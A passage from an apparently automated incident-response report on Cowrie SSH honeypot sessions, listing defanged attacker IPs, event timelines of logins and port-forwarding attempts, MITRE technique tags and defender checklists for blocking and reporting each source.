| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:00:32` | `cowrie.session.connect` |
| `2026-04-11 08:00:33` | `cowrie.client.version` |
| `2026-04-11 08:00:33` | `cowrie.client.kex` |
| `2026-04-11 08:00:34` | `cowrie.login.success` |
| `2026-04-11 08:00:35` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a71e6c4485

| Field | Detail |
|---|---|
| **Source IP** | `222.216.2[.]74` |
| **First Seen** | 2026-04-11 08:00 |
| **Last Seen** | 2026-04-11 08:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:00:40` | `cowrie.session.connect` |
| `2026-04-11 08:00:41` | `cowrie.client.version` |
| `2026-04-11 08:00:41` | `cowrie.client.kex` |
| `2026-04-11 08:00:42` | `cowrie.login.success` |
| `2026-04-11 08:00:43` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.216.2[.]74` to AbuseIPDB if not already reported
- [ ] Block `222.216.2[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d54454d7a9d

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-04-11 08:01 |
| **Last Seen** | 2026-04-11 08:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:01:16` | `cowrie.session.connect` |
| `2026-04-11 08:01:17` | `cowrie.client.version` |
| `2026-04-11 08:01:17` | `cowrie.client.kex` |
| `2026-04-11 08:01:19` | `cowrie.login.success` |
| `2026-04-11 08:01:20` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b351199337

| Field | Detail |
|---|---|
| **Source IP** | `75.157.194[.]2` |
| **First Seen** | 2026-04-11 08:01 |
| **Last Seen** | 2026-04-11 08:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:01:25` | `cowrie.session.connect` |
| `2026-04-11 08:01:26` | `cowrie.client.version` |
| `2026-04-11 08:01:26` | `cowrie.client.kex` |
| `2026-04-11 08:01:27` | `cowrie.login.success` |
| `2026-04-11 08:01:28` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.157.194[.]2` to AbuseIPDB if not already reported
- [ ] Block `75.157.194[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715f3ad744f6

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-04-11 08:02 |
| **Last Seen** | 2026-04-11 08:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:02:06` | `cowrie.session.connect` |
| `2026-04-11 08:02:06` | `cowrie.client.version` |
| `2026-04-11 08:02:06` | `cowrie.client.kex` |
| `2026-04-11 08:02:07` | `cowrie.login.success` |
| `2026-04-11 08:02:07` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-076e813a7015

| Field | Detail |
|---|---|
| **Source IP** | `95.79.108[.]51` |
| **First Seen** | 2026-04-11 08:02 |
| **Last Seen** | 2026-04-11 08:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:02:17` | `cowrie.session.connect` |
| `2026-04-11 08:02:17` | `cowrie.client.version` |
| `2026-04-11 08:02:17` | `cowrie.client.kex` |
| `2026-04-11 08:02:18` | `cowrie.login.success` |
| `2026-04-11 08:02:18` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.108[.]51` to AbuseIPDB if not already reported
- [ ] Block `95.79.108[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5127822b69e

| Field | Detail |
|---|---|
| **Source IP** | `36.64.33[.]82` |
| **First Seen** | 2026-04-11 08:03 |
| **Last Seen** | 2026-04-11 08:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:03:10` | `cowrie.session.connect` |
| `2026-04-11 08:03:11` | `cowrie.client.version` |
| `2026-04-11 08:03:11` | `cowrie.client.kex` |
| `2026-04-11 08:03:12` | `cowrie.login.success` |
| `2026-04-11 08:03:12` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.33[.]82` to AbuseIPDB if not already reported
- [ ] Block `36.64.33[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b608a7b5b1

| Field | Detail |
|---|---|
| **Source IP** | `52.159.229[.]2` |
| **First Seen** | 2026-04-11 08:06 |
| **Last Seen** | 2026-04-11 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:06:10` | `cowrie.session.connect` |
| `2026-04-11 08:06:10` | `cowrie.client.version` |
| `2026-04-11 08:06:11` | `cowrie.client.kex` |
| `2026-04-11 08:06:12` | `cowrie.login.success` |
| `2026-04-11 08:06:12` | `cowrie.session.params` |
| `2026-04-11 08:06:12` | `cowrie.command.input` |
| `2026-04-11 08:06:12` | `cowrie.log.closed` |
| `2026-04-11 08:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.229[.]2` to AbuseIPDB if not already reported
- [ ] Block `52.159.229[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be78ad08d39d

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-04-11 08:07 |
| **Last Seen** | 2026-04-11 08:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:07:24` | `cowrie.session.connect` |
| `2026-04-11 08:07:25` | `cowrie.client.version` |
| `2026-04-11 08:07:25` | `cowrie.client.kex` |
| `2026-04-11 08:07:26` | `cowrie.login.success` |
| `2026-04-11 08:07:27` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d9fbd76907e

| Field | Detail |
|---|---|
| **Source IP** | `186.215.204[.]109` |
| **First Seen** | 2026-04-11 08:08 |
| **Last Seen** | 2026-04-11 08:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:08:41` | `cowrie.session.connect` |
| `2026-04-11 08:08:42` | `cowrie.client.version` |
| `2026-04-11 08:08:42` | `cowrie.client.kex` |
| `2026-04-11 08:08:44` | `cowrie.login.success` |
| `2026-04-11 08:08:45` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.204[.]109` to AbuseIPDB if not already reported
- [ ] Block `186.215.204[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21bd20e1a26

| Field | Detail |
|---|---|
| **Source IP** | `190.117.96[.]174` |
| **First Seen** | 2026-04-11 08:11 |
| **Last Seen** | 2026-04-11 08:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:11:56` | `cowrie.session.connect` |
| `2026-04-11 08:11:56` | `cowrie.client.version` |
| `2026-04-11 08:11:56` | `cowrie.client.kex` |
| `2026-04-11 08:11:58` | `cowrie.login.success` |
| `2026-04-11 08:11:59` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.117.96[.]174` to AbuseIPDB if not already reported
- [ ] Block `190.117.96[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a3f83e3f1ab

| Field | Detail |
|---|---|
| **Source IP** | `213.103.113[.]159` |
| **First Seen** | 2026-04-11 08:12 |
| **Last Seen** | 2026-04-11 08:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:12:05` | `cowrie.session.connect` |
| `2026-04-11 08:12:05` | `cowrie.client.version` |
| `2026-04-11 08:12:05` | `cowrie.client.kex` |
| `2026-04-11 08:12:06` | `cowrie.login.success` |
| `2026-04-11 08:12:07` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.103.113[.]159` to AbuseIPDB if not already reported
- [ ] Block `213.103.113[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e19cb68e474

| Field | Detail |
|---|---|
| **Source IP** | `116.113.241[.]82` |
| **First Seen** | 2026-04-11 08:14 |
| **Last Seen** | 2026-04-11 08:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:14:10` | `cowrie.session.connect` |
| `2026-04-11 08:14:11` | `cowrie.client.version` |
| `2026-04-11 08:14:11` | `cowrie.client.kex` |
| `2026-04-11 08:14:13` | `cowrie.login.success` |
| `2026-04-11 08:14:13` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.241[.]82` to AbuseIPDB if not already reported
- [ ] Block `116.113.241[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5837fe1e1cc0

| Field | Detail |
|---|---|
| **Source IP** | `83.134.195[.]54` |
| **First Seen** | 2026-04-11 08:14 |
| **Last Seen** | 2026-04-11 08:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:14:18` | `cowrie.session.connect` |
| `2026-04-11 08:14:19` | `cowrie.client.version` |
| `2026-04-11 08:14:19` | `cowrie.client.kex` |
| `2026-04-11 08:14:20` | `cowrie.login.success` |
| `2026-04-11 08:14:20` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.134.195[.]54` to AbuseIPDB if not already reported
- [ ] Block `83.134.195[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efcebf283b3c

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]249` |
| **First Seen** | 2026-04-11 08:16 |
| **Last Seen** | 2026-04-11 08:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:16:19` | `cowrie.session.connect` |
| `2026-04-11 08:16:19` | `cowrie.client.version` |
| `2026-04-11 08:16:19` | `cowrie.client.kex` |
| `2026-04-11 08:16:21` | `cowrie.login.success` |
| `2026-04-11 08:16:21` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83dc8e72574

| Field | Detail |
|---|---|
| **Source IP** | `112.168.1[.]182` |
| **First Seen** | 2026-04-11 08:16 |
| **Last Seen** | 2026-04-11 08:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:16:30` | `cowrie.session.connect` |
| `2026-04-11 08:16:31` | `cowrie.client.version` |
| `2026-04-11 08:16:31` | `cowrie.client.kex` |
| `2026-04-11 08:16:33` | `cowrie.login.success` |
| `2026-04-11 08:16:34` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.1[.]182` to AbuseIPDB if not already reported
- [ ] Block `112.168.1[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5de3324649e4

| Field | Detail |
|---|---|
| **Source IP** | `183.3.133[.]47` |
| **First Seen** | 2026-04-11 08:16 |
| **Last Seen** | 2026-04-11 08:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:16:43` | `cowrie.session.connect` |
| `2026-04-11 08:16:44` | `cowrie.client.version` |
| `2026-04-11 08:16:44` | `cowrie.client.kex` |
| `2026-04-11 08:16:48` | `cowrie.login.success` |
| `2026-04-11 08:16:48` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.3.133[.]47` to AbuseIPDB if not already reported
- [ ] Block `183.3.133[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba3ba07bcacd

| Field | Detail |
|---|---|
| **Source IP** | `165.22.88[.]35` |
| **First Seen** | 2026-04-11 08:19 |
| **Last Seen** | 2026-04-11 08:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:19:43` | `cowrie.session.connect` |
| `2026-04-11 08:19:43` | `cowrie.client.version` |
| `2026-04-11 08:19:43` | `cowrie.client.kex` |
| `2026-04-11 08:19:44` | `cowrie.login.success` |
| `2026-04-11 08:19:44` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.88[.]35` to AbuseIPDB if not already reported
- [ ] Block `165.22.88[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de4111ee65f

| Field | Detail |
|---|---|
| **Source IP** | `52.159.229[.]2` |
| **First Seen** | 2026-04-11 08:20 |
| **Last Seen** | 2026-04-11 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:20:01` | `cowrie.session.connect` |
| `2026-04-11 08:20:01` | `cowrie.client.version` |
| `2026-04-11 08:20:02` | `cowrie.client.kex` |
| `2026-04-11 08:20:02` | `cowrie.login.success` |
| `2026-04-11 08:20:03` | `cowrie.session.params` |
| `2026-04-11 08:20:03` | `cowrie.command.input` |
| `2026-04-11 08:20:03` | `cowrie.log.closed` |
| `2026-04-11 08:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.229[.]2` to AbuseIPDB if not already reported
- [ ] Block `52.159.229[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9b88274c619

| Field | Detail |
|---|---|
| **Source IP** | `117.159.174[.]136` |
| **First Seen** | 2026-04-11 08:23 |
| **Last Seen** | 2026-04-11 08:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:23:46` | `cowrie.session.connect` |
| `2026-04-11 08:23:47` | `cowrie.client.version` |
| `2026-04-11 08:23:47` | `cowrie.client.kex` |
| `2026-04-11 08:23:49` | `cowrie.login.success` |
| `2026-04-11 08:23:49` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.159.174[.]136` to AbuseIPDB if not already reported
- [ ] Block `117.159.174[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb21a5f3117

| Field | Detail |
|---|---|
| **Source IP** | `120.198.138[.]185` |
| **First Seen** | 2026-04-11 08:24 |
| **Last Seen** | 2026-04-11 08:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:24:39` | `cowrie.session.connect` |
| `2026-04-11 08:24:40` | `cowrie.client.version` |
| `2026-04-11 08:24:40` | `cowrie.client.kex` |
| `2026-04-11 08:24:41` | `cowrie.login.success` |
| `2026-04-11 08:24:42` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.198.138[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.198.138[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b4c3a6bdb54

| Field | Detail |
|---|---|
| **Source IP** | `112.194.142[.]167` |
| **First Seen** | 2026-04-11 08:30 |
| **Last Seen** | 2026-04-11 08:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:30:03` | `cowrie.session.connect` |
| `2026-04-11 08:30:04` | `cowrie.client.version` |
| `2026-04-11 08:30:04` | `cowrie.client.kex` |
| `2026-04-11 08:30:05` | `cowrie.login.success` |
| `2026-04-11 08:30:06` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.194.142[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.194.142[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e957585c4fb9

| Field | Detail |
|---|---|
| **Source IP** | `186.201.54[.]90` |
| **First Seen** | 2026-04-11 08:32 |
| **Last Seen** | 2026-04-11 08:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:32:06` | `cowrie.session.connect` |
| `2026-04-11 08:32:07` | `cowrie.client.version` |
| `2026-04-11 08:32:07` | `cowrie.client.kex` |
| `2026-04-11 08:32:09` | `cowrie.login.success` |
| `2026-04-11 08:32:10` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:32:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.201.54[.]90` to AbuseIPDB if not already reported
- [ ] Block `186.201.54[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bed5430d28e

| Field | Detail |
|---|---|
| **Source IP** | `112.53.70[.]99` |
| **First Seen** | 2026-04-11 08:32 |
| **Last Seen** | 2026-04-11 08:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:32:15` | `cowrie.session.connect` |
| `2026-04-11 08:32:16` | `cowrie.client.version` |
| `2026-04-11 08:32:16` | `cowrie.client.kex` |
| `2026-04-11 08:32:19` | `cowrie.login.success` |
| `2026-04-11 08:32:20` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.53.70[.]99` to AbuseIPDB if not already reported
- [ ] Block `112.53.70[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4828e1146a

| Field | Detail |
|---|---|
| **Source IP** | `180.151.254[.]217` |
| **First Seen** | 2026-04-11 08:32 |
| **Last Seen** | 2026-04-11 08:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:32:20` | `cowrie.session.connect` |
| `2026-04-11 08:32:20` | `cowrie.client.version` |
| `2026-04-11 08:32:20` | `cowrie.client.kex` |
| `2026-04-11 08:32:22` | `cowrie.login.success` |
| `2026-04-11 08:32:22` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.151.254[.]217` to AbuseIPDB if not already reported
- [ ] Block `180.151.254[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55ce1dad388b

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-04-11 08:33 |
| **Last Seen** | 2026-04-11 08:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 08:33:29` | `cowrie.session.connect` |
| `2026-04-11 08:33:29` | `cowrie.client.version` |
| `2026-04-11 08:33:29` | `cowrie.client.kex` |
| `2026-04-11 08:33:32` | `cowrie.login.success` |
| `2026-04-11 08:33:32` | `cowrie.direct-tcpip.request` |
| `2026-04-11 08:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
